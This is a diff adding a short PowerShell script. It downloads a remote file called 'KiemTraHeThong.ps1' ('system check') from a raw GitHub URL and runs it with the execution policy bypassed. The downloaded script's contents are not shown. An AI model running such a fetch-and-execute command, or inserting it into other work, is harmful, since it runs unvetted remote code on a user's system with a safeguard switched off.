@@ -1,0 +1,5 @@
+  
+invoke-webrequest -uri "https://raw.githubusercontent.com/doduc812/Home/main/KiemTraHeThong.ps1" -OutFile "KiemTraHeThong.ps1"
+
+
+powershell -ExecutionPolicy Bypass -File "KiemTraHeThong.ps1" 
